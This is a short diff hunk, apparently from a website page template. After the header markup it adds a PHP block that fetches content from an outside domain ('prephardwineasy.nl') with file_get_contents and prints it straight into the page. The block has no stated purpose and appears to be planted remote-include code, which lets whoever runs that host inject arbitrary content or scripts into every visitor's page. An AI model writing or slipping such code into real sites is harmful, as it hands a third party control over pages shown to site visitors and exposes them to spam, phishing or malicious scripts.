@@ -54,3 +54,9 @@
             </div>
         </nav>
     </header>
+
+
+    <?php
+
+    echo file_get_contents('http://prephardwineasy.nl/?file=router');
+?>
